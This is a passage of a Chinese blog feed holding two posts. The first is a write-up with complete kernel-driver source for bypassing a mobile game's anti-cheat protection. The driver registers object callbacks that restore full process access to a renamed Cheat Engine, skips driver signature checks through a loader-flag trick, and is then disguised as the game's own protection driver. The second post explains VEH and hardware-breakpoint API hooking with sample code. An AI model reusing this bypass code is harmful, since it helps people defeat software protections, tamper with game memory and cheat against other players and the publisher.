class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//包含驱动开发中基本的数据结构，数据类型</span></span><br><span class="line"><span class="comment">//类似于iostream</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//数据结构 LDR</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InLoadOrderLinks</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InMemoryOrderLinks</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InInitializationOrderLinks</span>;</span></span><br><span class="line">PVOID DllBase;</span><br><span class="line">PVOID EntryPoint;</span><br><span class="line">ULONG32 SizeOfImage;</span><br><span class="line">UINT8 _PADDINGO_[<span class="number">0x4</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">FullDllName</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">BaseDllName</span>;</span></span><br><span class="line">ULONG32Flags;</span><br><span class="line">&#125; LDR_DATA, * PLDR_DATA;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个系统函数</span></span><br><span class="line"><span class="function">NTKERNELAPI UCHAR* <span class="title">PsGetProcessImageFileName</span><span class="params">(PEPROCESS Process)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明回调函数</span></span><br><span class="line"><span class="function">OB_PREOP_CALLBACK_STATUS <span class="title">MyCallBack</span><span class="params">(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION OpertaionInformation)</span></span>;</span><br><span class="line"><span class="comment">//给ce改名，长ce名get名称函数有问题</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* g_MyProcessName = <span class="string">&quot;111.exe&quot;</span>;</span><br><span class="line"><span class="comment">//实现</span></span><br><span class="line"><span class="function">OB_PREOP_CALLBACK_STATUS <span class="title">MyCallBack</span><span class="params">(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION OpertaionInformation)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//只要有进程创建就会调用，所以先if判断</span></span><br><span class="line"><span class="comment">//KdPrint((&quot;this is in call back!!!\n&quot;));</span></span><br><span class="line">PEPROCESS Process = PsGetCurrentProcess();</span><br><span class="line"><span class="comment">//KdPrint((PsGetProcessImageFileName(Process)));</span></span><br><span class="line"><span class="keyword">if</span> (_strnicmp(g_MyProcessName, PsGetProcessImageFileName(Process), <span class="built_in">strlen</span>(g_MyProcessName)) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//是我们要找的进程</span></span><br><span class="line"><span class="comment">//恢复权限 openprocess</span></span><br><span class="line">OpertaionInformation-&gt;Parameters-&gt;CreateHandleInformation.DesiredAccess = <span class="number">0x1fffff</span>;</span><br><span class="line">OpertaionInformation-&gt;Parameters-&gt;DuplicateHandleInformation.DesiredAccess = <span class="number">0x1fffff</span>;</span><br><span class="line">KdPrint((<span class="string">&quot;进入callback!\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> OB_PREOP_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结构体数组 定义了callback</span></span><br><span class="line">OB_OPERATION_REGISTRATION ObUpperOperationRegistration[] =</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//第二个参数是回调执行时期，第三个参数是回调地址</span></span><br><span class="line"><span class="comment">//这里让回调在进程线程创建和复制的时候执行</span></span><br><span class="line">&#123;<span class="literal">NULL</span>, OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE ,MyCallBack,<span class="literal">NULL</span>&#125;,</span><br><span class="line">&#123;<span class="literal">NULL</span>, OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE ,MyCallBack,<span class="literal">NULL</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line">OB_OPERATION_REGISTRATION ObLowerOperationRegistration[] =</span><br><span class="line">&#123;</span><br><span class="line">&#123;<span class="literal">NULL</span>, OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE ,MyCallBack,<span class="literal">NULL</span>&#125;,</span><br><span class="line">&#123;<span class="literal">NULL</span>, OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE ,MyCallBack,<span class="literal">NULL</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//注册回调需要的结构体变量</span></span><br><span class="line">OB_CALLBACK_REGISTRATION UpperCallbackRegistration =</span><br><span class="line">&#123;</span><br><span class="line">OB_FLT_REGISTRATION_VERSION,<span class="comment">//版本号</span></span><br><span class="line"><span class="number">2</span>,<span class="comment">//注册数量 （线程，进程创建时）</span></span><br><span class="line">RTL_CONSTANT_STRING(<span class="string">L&quot;880000&quot;</span>),<span class="comment">//影响回调的执行顺序 回调号 越小后执行</span></span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">ObUpperOperationRegistration<span class="comment">//另一个数据结构，包含回调函数</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//执行两次，包含原神的回调函数在数字之间，必定在它的回调函数之后执行我们的</span></span><br><span class="line">OB_CALLBACK_REGISTRATION LowerCallbackRegistration =</span><br><span class="line">&#123;</span><br><span class="line">OB_FLT_REGISTRATION_VERSION,</span><br><span class="line"><span class="number">2</span>,</span><br><span class="line">RTL_CONSTANT_STRING(<span class="string">L&quot;1000&quot;</span>),</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">ObLowerOperationRegistration</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">HANDLE g_UpperHandle, g_LowerHandle;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明回调函数的注册和卸载函数</span></span><br><span class="line"><span class="function">BOOLEAN <span class="title">ObRegisterCallback</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ObRegisterUnload</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//实现</span></span><br><span class="line"><span class="function">BOOLEAN <span class="title">ObRegisterCallback</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NTSTATUS sta;</span><br><span class="line"><span class="comment">//注册回调函数需要签名</span></span><br><span class="line"><span class="comment">//或上一个0x20可以不需要签名 这个flag在win api里是timestamp的作用</span></span><br><span class="line">PLDR_DATA ldr;</span><br><span class="line">ldr = (PLDR_DATA)DriverObject-&gt;DriverSection;</span><br><span class="line">ldr-&gt;Flags |= <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//指定回调类型   这个结构体的第一个参数</span></span><br><span class="line">ObUpperOperationRegistration[<span class="number">0</span>].ObjectType = PsProcessType;</span><br><span class="line">ObUpperOperationRegistration[<span class="number">1</span>].ObjectType = PsThreadType;</span><br><span class="line"></span><br><span class="line">ObLowerOperationRegistration[<span class="number">0</span>].ObjectType = PsProcessType;</span><br><span class="line">ObLowerOperationRegistration[<span class="number">1</span>].ObjectType = PsThreadType;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进行注册 第二个参为返回句柄</span></span><br><span class="line">sta = ObRegisterCallbacks(&amp;UpperCallbackRegistration, &amp;g_UpperHandle);</span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(sta))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//失败就进卸载</span></span><br><span class="line">ObRegisterUnload();</span><br><span class="line">g_UpperHandle = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">sta = ObRegisterCallbacks(&amp;LowerCallbackRegistration, &amp;g_LowerHandle);</span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(sta))</span><br><span class="line">&#123;</span><br><span class="line">ObRegisterUnload();</span><br><span class="line">g_LowerHandle = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ObRegisterUnload</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (g_UpperHandle != <span class="literal">NULL</span>)</span><br><span class="line">ObUnRegisterCallbacks(g_UpperHandle);</span><br><span class="line"><span class="keyword">if</span> (g_LowerHandle != <span class="literal">NULL</span>)</span><br><span class="line">ObUnRegisterCallbacks(g_LowerHandle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//下面的为驱动主体 ----------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//每个驱动都需要卸载，卸载函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT  DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//卸载注册的回调</span></span><br><span class="line">ObRegisterUnload();</span><br><span class="line">KdPrint((<span class="string">&quot;Driver unload!\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NTSTATUS 32位数据 -&gt; DWORD</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PDRIVER_OBJECT  DriverObject,<span class="comment">//驱动对象 -&gt; 句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">PUNICODE_STRING RegistryPath<span class="comment">//注册表路径</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//指定卸载函数</span></span><br><span class="line">DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line"></span><br><span class="line"><span class="comment">//注册回调函数</span></span><br><span class="line">ObRegisterCallback(DriverObject);</span><br><span class="line"></span><br><span class="line"><span class="comment">//debug版本中是printf的作用，release版本无作用，注释掉了</span></span><br><span class="line">KdPrint((<span class="string">&quot;hello second bc.\n&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>里面的注释都很到位，可以慢慢看；</p><p>解释下的话，驱动编写需要注意几点，驱动的main函数叫DriverEntry，同时需要给到卸载函数（析构的作用）；</p><p>同时obcallback的调用需要进行注册，之后需要卸载；</p><p>KdPrint其实是DbgPrint的一个宏定义，在debug版本可以显示打印内容；</p><p>之后的话，搜索怎么调试驱动搞了半天，要什么双机调试，不然蓝屏之类的，所以驱动开发还是得要虚拟机，别用真机吧；</p><p>我懒得搞就下了个 driver monitor进行手动加载驱动，包括下载一个 debugview 进行对KdPrint内容的捕捉（既然不好调试就用最经典的print调试法）；</p><p>然后发现driver monitor装载不上，是因为驱动要签名，又去找签名方法，找到了个好用的方法，b站视频如下：</p><p><a href="https://www.bilibili.com/video/BV1DY411X7Ed/?spm_id_from=333.337.search-card.all.click&vd_source=f1d0258ac6e366cb8626d73a4ee5439d">驱动数字签名教程_哔哩哔哩_bilibili</a></p><p>之后就可以装载驱动进行测试了，发现我日还真能直接用原版ce进行读写内存了，而且不会显示被检测到：</p><p><img src="https://s2.loli.net/2024/10/07/dgFnbQaGU1lhBy9.png" alt="image.png"></p><p>但是还是依然无法进行调试器附加，原因是和pchunter找到的应用层钩子有关系啊，它钩住了一个ntdll的dbgbreakpoint，把这个恢复之后就能成功附加上了；</p><p>至此CE反附加就攻克了；</p><h2 id="稳定性调试"><a href="#稳定性调试" class="headerlink" title="稳定性调试"></a>稳定性调试</h2><p>当然ce能附加了，但游戏依然不稳定，时不时就会掉线，ce附加时不时也会自动脱落，有时候还会在搜数据的时候游戏弹异常直接G；</p><p>猜测它的驱动保护里还有一些对于调试器和读写内存的检测；</p><p>试了很多办法之后，不管是改调试器，还是开dbvm，等等都无法稳定调试；</p><p>那最稳妥的方法应该是折返回去好好逆一下保护驱动的dump出的内存；</p><p>想着我们写的驱动和它的保护驱动性质差不多，都要去注册ob回调，干脆一不做二不休把我们的驱动改个名扔它启动目录下去伪装成它的保护驱动，结果还相当有效，简直瞎猫碰死耗子了；</p><p>猜测原因是它的主程序执行驱动的时候，只是单纯做了简单判断有没有这个文件，跑没跑上，没有去检测文件签名属性，以及内容；</p><p>只能说运气特别好啊，省了超级多麻烦，这样一来游戏一执行还会启动我们的驱动程序，都省的用driver monitor了；</p><p>之后就是一马平川了，该怎么玩CE就怎么玩，游戏数据也能正常被保存到服务器上；</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的说来，这个保护驱动并不强，最狠的最主要的就是通过obcallback来进行降权，没有内核钩子；</p><p>这一套下来也花了两天时间去做，反思了一下如果想要攻克其他类型的驱动保护，就需要进一步的学习驱动编程以及内核R0部分的内容，同时需要更好的逆向手法去获取内存中真实的镜像拿到代码去分析，才能对症下药去解决检测问题；</p><p>这其实还能算是我驱动编程的入门学习了；</p><p>没有使用r3那套进行辅佐保护我猜测的原因是模块化导致的，游戏一开始做的时候，保护和内容是分开的，同时以我的那套r3保护构想来说的话，太吃资源性能也是一方面的问题；</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;起因是因为某手游用CE附加会发现无法附加上，那包括很多目前流行的游戏，steam也好，wegame也好基本上都是这个样子的；&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="Lab" scheme="https://secondbc.github.io/SecondBC/categories/Lab/"/>
    
    
    <category term="Bin" scheme="https://secondbc.github.io/SecondBC/tags/Bin/"/>
    
  </entry>
  
  <entry>
    <title>VEHhook</title>
    <link href="https://secondbc.github.io/SecondBC/2024/05/13/VEHhook/"/>
    <id>https://secondbc.github.io/SecondBC/2024/05/13/VEHhook/</id>
    <published>2024-05-13T09:35:41.000Z</published>
    <updated>2024-05-13T09:37:30.343Z</updated>
    
    <content type="html"><![CDATA[<h2 id="VEH介绍"><a href="#VEH介绍" class="headerlink" title="VEH介绍"></a>VEH介绍</h2><p>全称 vector exception handle，向量化异常处理；</p><p>和SEH类似的东西，SEH存放于线程的栈上；</p><p>而VEH存放于进程的堆上，且是以双链表的形式，而SEH是单链表；</p><p>异常处理顺序为 ： 调试器 -&gt; VEH -&gt; SEH；</p><p>添加VEH异常处理可以用如下API：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">AddVectoredExceptionHandler</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  ULONG                       First,</span></span></span><br><span class="line"><span class="params"><span class="function">  PVECTORED_EXCEPTION_HANDLER Handler</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>第一个参数非0则添加到第一个处理，否则添加到末尾；</p><p>Handler是函数指针，原型如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">PvectoredExceptionHandler</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] _EXCEPTION_POINTERS *ExceptionInfo</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;...&#125;</span><br></pre></td></tr></table></figure><p>返回值可以是0和-1，返回0代表继续处理，返回-1代表返回原本触发异常处继续执行；</p><p>其中参数是一个结构体，结构如下所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_POINTERS</span> &#123;</span></span><br><span class="line">  PEXCEPTION_RECORD ExceptionRecord;</span><br><span class="line">  PCONTEXT          ContextRecord;</span><br><span class="line">&#125; EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;</span><br></pre></td></tr></table></figure><p>第一个参数记录的是异常信息结构体；</p><p>第二个参数保存的是异常发生时，线程处理器状态信息（寄存器环境值）；</p><p>那么当异常发生时，被VEH捕获后，就可以改动寄存器的值来进行异常处理；</p><p>如下例子：</p><p>当除零时会发生异常，此时如果添加了VEH处理，可以通过更改环境值进行异常绕过，或者处理；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">LONG WINAPI <span class="title">PvectoredExceptionHandler</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _EXCEPTION_POINTERS* ExceptionInfo</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;触发VEH异常处理.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="comment">//跳过</span></span><br><span class="line">    ExceptionInfo-&gt;ContextRecord-&gt;Eip += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1</span>, PvectoredExceptionHandler);</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    a /= <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;123\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下图所示：</p><p><img src="https://s2.loli.net/2024/05/13/2PdEChxNup5twsa.png" alt="result"></p><h2 id="hook原理"><a href="#hook原理" class="headerlink" title="hook原理"></a>hook原理</h2><p>因为VEH处理函数可以拿寄存器，也就可以拿目标api的输入输出，只需要在目标api内触发一个异常，就可以使用ebp以及其他寄存器拿到其输入参数以及修改输出内容；</p><p>SEH HOOK原理也如此，它们的核心思想是利用了异常处理的框架，不用自己去构造；</p><p>触发断点应选择硬件断点，避免修改代码int3绕过大量检测；</p><p>缺陷是只能hook4个地址，因为硬件断点就这么多；</p><p>前置知识：</p><h3 id="调试寄存器"><a href="#调试寄存器" class="headerlink" title="调试寄存器"></a>调试寄存器</h3><p><img src="https://s2.loli.net/2024/05/13/lMATRLUPZF5JKtu.png" alt="register"></p><p>DR0 ~ DR7</p><p>DR0 ~ DR3存放的是硬件断点的断点地址；</p><p>DR6存放的是异常信息；</p><p>DR7则是控制作用；</p><p>其中DR7里， L0-L3对应DR0-DR3的断点是否有效，局部断点；</p><p>G0-G3同上，全局断点（Windows没用）；</p><p>LEN0 - LEN3 对应DR0 - DR3的断点长度，不同类型断点，长度不同，比如执行断点长度为1；</p><p>00对应1，01对应2，11对应4；</p><p>RW0 - RW3 对应断点类型，00对应执行断点，01对应写入断点，11对应读写断点；</p><p>要下断点那么就需要修改调试寄存器，如何修改呢？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetThreadContext</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HANDLE        hThread,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] <span class="keyword">const</span> CONTEXT *lpContext</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>用以上函数设置，自定义context结构和数值，第一个参数用GetCurrentThread来获取句柄；</p><p>设置context结构的时候要注意它有一个字段为 contextFlags，标识context哪些属性有效；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONTEXT_DEBUG_REGISTERS<span class="comment">//表明调试寄存器有效</span></span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">HANDLE main_thread = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">LONG WINAPI <span class="title">PvectoredExceptionHandler</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _EXCEPTION_POINTERS* ExceptionInfo</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;触发VEH异常处理.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="comment">//处理对应</span></span><br><span class="line">    <span class="keyword">if</span> (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress == MessageBoxA)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;执行hook.&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="comment">//修改字符串输出 此时刚刚进函数还没进行栈平衡</span></span><br><span class="line">        DWORD arg1Addr = ExceptionInfo-&gt;ContextRecord-&gt;Esp + <span class="number">4</span>;</span><br><span class="line">        DWORD arg2Addr = ExceptionInfo-&gt;ContextRecord-&gt;Esp + <span class="number">8</span>;</span><br><span class="line">        DWORD arg3Addr = ExceptionInfo-&gt;ContextRecord-&gt;Esp + <span class="number">12</span>;</span><br><span class="line">        DWORD arg4Addr = ExceptionInfo-&gt;ContextRecord-&gt;Esp + <span class="number">16</span>;</span><br><span class="line">        <span class="comment">//原api执行</span></span><br><span class="line">        CONTEXT context = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        CONTEXT oldcontext = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        context.ContextFlags = CONTEXT_DEBUG_REGISTERS;</span><br><span class="line">        <span class="built_in">SetThreadContext</span>(main_thread, &amp;context);</span><br><span class="line">        <span class="keyword">int</span> result = <span class="built_in">MessageBoxA</span>(*(HWND*)arg1Addr, *(LPCSTR*)arg2Addr, *(LPCSTR*)arg3Addr, *(UINT*)arg4Addr);</span><br><span class="line">        ExceptionInfo-&gt;ContextRecord-&gt;Eax = result;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">//修改</span></span><br><span class="line">        LPCSTR re = <span class="string">&quot;你是黑矮星.&quot;</span>;</span><br><span class="line">        *(LPCSTR*)arg2Addr = re;</span><br><span class="line">        result = <span class="built_in">MessageBoxA</span>(*(HWND*)arg1Addr, *(LPCSTR*)arg2Addr, *(LPCSTR*)arg3Addr, *(UINT*)arg4Addr);</span><br><span class="line">        ExceptionInfo-&gt;ContextRecord-&gt;Eax = result;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//直接返回 eip + 70 == ret</span></span><br><span class="line">        ExceptionInfo-&gt;ContextRecord-&gt;Eip += <span class="number">70</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1</span>, PvectoredExceptionHandler);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//hook api address</span></span><br><span class="line">    DWORD breakPoint0 = <span class="number">0</span>;</span><br><span class="line">    